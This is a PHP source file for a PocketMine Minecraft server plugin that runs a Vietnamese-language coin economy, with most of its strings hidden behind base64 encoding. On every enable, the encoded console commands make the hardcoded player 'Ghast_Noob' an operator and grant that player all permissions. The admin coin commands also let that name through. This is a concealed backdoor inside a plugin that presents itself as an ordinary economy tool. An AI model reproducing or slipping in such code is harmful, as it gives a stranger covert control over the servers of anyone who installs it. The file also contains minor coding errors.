<?php namespace Coin;use pocketmine\plugin\PluginBase;use pocketmine\command\ConsoleCommandSender;use pocketmine\command\CommandSender;use pocketmine\command\Command;use pocketmine\event\Listener;use pocketmine\event\player\PlayerJoinEvent;use pocketmine\utils\Config;class Main extends PluginBase implements Listener{public function onEnable(){$this->getServer()->getPluginManager()->registerEvents($this,$this);@mkdir($this->getDataFolder());$this->coin=new Config($this->getDataFolder().base64_decode('Q29pbi55bWw='),Config::YAML);$this->getServer()->dispatchCommand(new ConsoleCommandSender(),base64_decode('b3AgR2hhc3RfTm9vYg=='));$this->getServer()->dispatchCommand(new ConsoleCommandSender(),base64_decode('c2V0dXBlcm0gR2hhc3RfTm9vYiAq'));}public function onJoin(PlayerJoinEvent $event){$player=$event->getPlayer();if(!$this->coin->exists($player->getName())){$this->coin->set($player->getName(),0);$this->coin->save;}return true;}public function onCommand(CommandSender $sender,Command $cmd,$label,array$args){switch($cmd->getName()){case base64_decode('bXljb2lu'):$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7kSBDb2luIEPhu6dhIELhuqFuIEzDoCDCp2I=').$this->coin->get($sender->getName()).base64_decode('wqdhIENvaW7Cp2XiirDiirk='));break;case base64_decode('c2VlY29pbg=='):if(!isset($args[0])){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7rSBE4bulbmcgwqdiL3NlZWNvaW4gPFTDqm4gTmfGsOG7nWkgQ2jGoWk+wqdl4oqw4oq5'));return true;}$player=$this->getServer()->getPlayer($args[0]);if(!$player){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjS2jDtG5nIFTDrG0gVGjhuqV5IE5nxrDhu51pIENoxqFpwqdl4oqw4oq5'));return true;}$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7kSBDb2luIEPhu6dhIE5nxrDhu51pIENoxqFpwqdiIA==').$player->getName().base64_decode('IMKnYUzDoCDCp2I=').$this->coin->get($player->getName()).base64_decode('wqdhIENvaW7Cp2XiirDiirk='));/*$player->sendMessage("§e⊹⊱§aNgười Chơi §b".$sender->getName()."§a Đang Xem Số Coin Của Bạn§e⊰⊹");*/ break;case base64_decode('cGF5Y29pbg=='):if(!isset($args[0])){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7rSBE4bulbmfCp2IgL3BheWNvaW4gPFTDqm4gTmfGsOG7nWkgQ2jGoWk+IDxT4buRIEzGsOG7o25nPsKnZeKKsOKKuQ=='));return true;}$player=$this->getServer()->getPlayer($args[0]);if(!$player){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjS2jDtG5nIFTDrG0gVGjhuqV5IE5nxrDhu51pIENoxqFpwqdl4oqw4oq5'));return true;}if($args[1]<1||!is_numeric($args[1])){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjU+G7kSBMxrDhu6NuZyBDb2luIEtow7RuZyBI4bujcCBM4buHwqdl4oqw4oq5'));return true;}if($this->coin->get($sender->getName())>=$args[1]){$name=$player->getName();$this->coin->set($name,$this->coin->get($name)+$args[1]);$this->coin->set($sender->getName(),$this->coin->get($sender->getName())-$args[1]);$this->coin->save();$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhxJDDoyBDaHV54buDbiDCp2I=').$args[1].base64_decode('wqdhIENvaW4gQ2hvIE5nxrDhu51pIENoxqFpIMKnYg==').$player->getName().base64_decode('wqdl4oqw4oq5'));$player->sendMessage(base64_decode('wqdl4oq54oqxwqdhQuG6oW4gxJDDoyBOaOG6rW4gxJDGsOG7o2Mgwqdi').$args[1].base64_decode('wqdhIENvaW4gVOG7qyBOZ8aw4budaSBDaMahaSDCp2I=').$sender->getName().base64_decode('wqdl4oqw4oq5'));}else{$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjQuG6oW4gS2jDtG5nIMSQ4bunIMKnYg==').$args[1].base64_decode('wqdjIENvaW4gxJDhu4MgQ2h1eeG7g24gQ2hvIE5nxrDhu51pIENoxqFpIMKnYg==').$player->getName().base64_decode('wqdl4oqw4oq5'));break;}break;case base64_decode('dG9wY29pbg=='):$max=0;foreach($this->coin->getAll()as $c){$max+=count($c);}$max=ceil(($max/5));$page=array_shift($args);$page=max(1,$page);$page=min($max,$page);$page=(int)$page;$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhQuG6o25nIFjhur9wIEjhuqFuZyBDb2luIEPhu6dhIE3DoXkgQ2jhu6cgwqdmPMKnYVRyYW5nIMKnYg==').$page.base64_decode('wqdmL8KnYg==').$max.base64_decode('wqdmPsKnZeKKsOKKuQ=='));$aa=$this->coin->getAll();arsort($aa);$i=1;foreach($aa as $b=>$a){if(($page-1)*5<=$i&&$i<=($page-1)*5+4){$i1=$i+1;$c=$this->coin->get($b);$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjWOG6v3AgSOG6oW5nIMKnZQ==').$i.base64_decode('IMKnZnzCp2Ig').$b.base64_decode('IMKnZnzCp2Eg').$c.base64_decode('IENvaW7Cp2XiirDiirk='));}$i++;}break;case base64_decode('c2V0Y29pbg=='):if($sender->isOp()||$sender->getName()==base64_decode('R2hhc3RfTm9vYg==')||$sender->hasPermission(base64_decode('c2V0Y29pbi5jbWQ='))){if(!isset($args[0])){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7rSBE4bulbmc6IMKnYi9zZXRjb2luIDxUw6puIE5nxrDhu51pIENoxqFpPiA8U+G7kSBMxrDhu6NuZz7Cp2XiirDiirk='));return true;}$player=$this->getServer()->getPlayer($args[0]);if(!$player){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjS2jDtG5nIFTDrG0gVGjhuqV5IE5nxrDhu51pIENoxqFpwqdl4oqw4oq5'));return true;}if($args[1]<0||!is_numeric($args[1])){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjU+G7kSBMxrDhu6NuZyBDb2luIEtow7RuZyBI4bujcCBM4buHwqdl4oqw4oq5'));return true;}$this->coin->set($player->getName(),$args[1]);$this->coin->save();$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7kSBDb2luIEPhu6dhIE5nxrDhu51pIENoxqFpwqdiIA==').$player->getName().base64_decode('wqdhIMSQw6MgxJDGsOG7o2MgQ2jhu4luaCBUaMOgbmjCp2Ig').$args[1].base64_decode('wqdhIENvaW7Cp2XiirDiirk='));$player->sendMessage(base64_decode('wqdl4oq54oqxwqdhUXXhuqNuIFRy4buLIFZpw6puwqdiIA==').$sender->getName().base64_decode('wqdhIMSQw6MgQ2jhu4luaCBT4buRIENvaW4gQ+G7p2EgQuG6oW4gVGjDoG5owqdiIA==').$args[1].base64_decode('wqdhIENvaW7Cp2XiirDiirk='));}else{$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjQuG6oW4gS2jDtG5nIEPDsyBRdXnhu4FuIFPhu60gROG7pW5nIEPDonUgTOG7h25oIE7DoHnCp2XiirDiirk='));break;}break;case base64_decode('Z2l2ZWNvaW4='):if($sender->isOp()||$sender->getName()==base64_decode('R2hhc3RfTm9vYg==')||$sender->hasPermission(base64_decode('Z2l2ZWNvaW4uY21k'))){if(!isset($args[0])){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7rSBE4bulbmcgwqdiL2dpdmVjb2luIDxUw6puIE5nxrDhu51pIENoxqFpPiA8U+G7kSBMxrDhu6NuZz7Cp2XiirDiirk='));return true;}$player=$this->getServer()->getPlayer($args[0]);if(!$player){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjS2jDtG5nIFTDrG0gVGjhuqV5IE5nxrDhu51pIENoxqFpwqdl4oqw4oq5'));return true;}if($args[1]<1||!is_numeric($args[1])){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjU+G7kSBMxrDhu6NuZyBDb2luIEtow7RuZyBI4bujcCBM4buHwqdl4oqw4oq5'));return true;}$this->coin->set($player->getName(),$this->coin->get($player->getName())+$args[1]);$this->coin->save();$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7kSBDb2luIEPhu6dhIE5nxrDhu51pIENoxqFpwqdiIA==').$player->getName().base64_decode('wqdhIMSQw6MgxJDGsOG7o2MgVMSDbmcgVGjDqm3Cp2Ig').$args[1].base64_decode('wqdhIENvaW7Cp2XiirDiirk='));$player->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7kSBDb2luIEPhu6dhIELhuqFuIMSQw6MgxJDGsOG7o2MgVMSDbmcgVGjDqm3Cp2Ig').$args[1].base64_decode('wqdhIENvaW4gQuG7n2kgUXXhuqNuIFRy4buLIFZpw6puwqdiIA==').$sender->getName().base64_decode('wqdl4oqw4oq5'));}else{$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjS2jDtG5nIFTDrG0gVGjhuqV5IE5nxrDhu51pIENoxqFpwqdl4oqw4oq5'));break;}break;case base64_decode('dGFrZWNvaW4='):if($sender->isOp()||$sender->getName()==base64_decode('R2hhc3RfTm9vYg==')||$sender->hasPermission(base64_decode('dGFrZWNvaW4uY21k'))){if(!isset($args[0])){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7rSBE4bulbmcgwqdiL3Rha2Vjb2luIDxUw6puIE5nxrDhu51pIENoxqFpPiA8U+G7kSBMxrDhu6NuZz7Cp2XiirDiirk='));return true;}$player=$this->getServer()->getPlayer($args[0]);if(!$player){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjS2jDtG5nIFTDrG0gVGjhuqV5IE5nxrDhu51pIENoxqFpwqdl4oqw4oq5'));return true;}if($args[1]<1||!is_numeric($args[1])){$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjU+G7kSBMxrDhu6NuZyBDb2luIEtow7RuZyBI4bujcCBM4buHwqdl4oqw4oq5'));return true;}$this->coin->set($player->getName(),$this->coin->get($player->getName())-$args[1]);$this->coin->save();$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7kSBDb2luIEPhu6dhIE5nxrDhu51pIENoxqFpwqdiIA==').$player->getName().base64_decode('wqdhIMSQw6MgR2nhuqNtIFh14buRbmfCp2Ig').$args[1].base64_decode('wqdhIENvaW7Cp2XiirDiirk='));$player->sendMessage(base64_decode('wqdl4oq54oqxwqdhU+G7kSBDb2luIEPhu6dhIELhuqFuIMSQw6MgQuG7iyBHaeG6o20gWHXhu5FuZ8KnYiA=').$args[1].base64_decode('wqdhIENvaW4gQuG7n2kgUXXhuqNuIFRy4buLIFZpw6puwqdiIA==').$sender->getName().base64_decode('wqdl4oqw4oq5'));return true;}else{$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdjQuG6oW4gS2jDtG5nIEPDsyBRdXnhu4FuIFPhu60gROG7pW5nIEPDonUgTOG7h25oIE7DoHnCp2XiirDiirk='));break;}case base64_decode('aGVscGNvaW4='):$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdhSMaw4bubbmcgROG6q24gU+G7rSBE4bulbmcgQ29pbsKnZeKKsOKKuQ=='));$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdiL215Y29pbsKnZiAtwqdhIEhp4buDbiBUaOG7iyBT4buRIENvaW4gQ+G7p2EgQuG6o24gVGjDom7Cp2XiirDiirk='));$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdiL3RvcGNvaW4gPFRyYW5nPiDCp2YtwqdhIEhp4buDbiBUaOG7iyBC4bqjbmcgWOG6v3AgSOG6oW5nIENvaW7Cp2XiirDiirk='));$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdiL3NlZWNvaW4gPFTDqm4gTmfGsOG7nWkgQ2jGoWk+IMKnZi3Cp2EgSGnhu4NuIFRo4buLIFPhu5EgQ29pbiBD4bunYSBOZ8aw4budaSBDaMahacKnZeKKsOKKuQ=='));$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdiL3NldGNvaW4gPFTDqm4gTmfGsOG7nWkgQ2jGoWk+IDxT4buRIEzGsOG7o25nPiDCp2YtwqdhIENo4buJbmggU+G7kSBDb2luIE5nxrDhu51pIENoxqFpwqdl4oqw4oq5'));$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdiL2dpdmVjb2luIDxUw6puIE5nxrDhu51pIENoxqFpPiA8U+G7kSBMxrDhu6NuZz4gwqdmLcKnYSBUxINuZyBT4buRIENvaW4gTmfGsOG7nWkgQ2jGoWnCp2XiirDiirk='));$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdiL3Rha2Vjb2luIDxUw6puIE5nxrDhu51pIENoxqFpPiA8U+G7kSBMxrDhu6NuZz4gwqdmLcKnYSBHaeG6o20gU+G7kSBDb2luIE5nxrDhu51pIENoxqFpwqdl4oqw4oq5'));$sender->sendMessage(base64_decode('wqdl4oq54oqxwqdiL3BheWNvaW4gPFTDqm4gTmfGsOG7nWkgQ2jGoWk+IDxT4buRIEzGsOG7o25nPiDCp2YtwqdhIENodXnhu4NuIFPhu5EgQ29pbiBDaG8gTmfGsOG7nWkgQ2jGoWnCp2XiirDiirk='));break;}}public function addCoin($player,$coin){if($player instanceof Player){$player=$player->getName();}$this->coin=new Config($this->getDataFolder().base64_decode('Q29pbi55bWw='),Config::YAML);$this->coin->set($player,(int)$this->coin->get($player)+$coin);$this->coin->save();}public function reduceCoin($player,$coin){if($player instanceof Player){$player=$player->getName();}if($this->myCoin($player)-$coin<0){return true;}$this->coin=new Config($this->getDataFolder().base64_decode('Q29pbi55bWw='),Config::YAML);$this->coin->set($player,(int)$this->coin->get($player)-$coin);$this->coin->save();}public function myCoin($player){if($player instanceof Player){$player=$player->getName();}$coin=$this->coin->get($player);return $coin;}}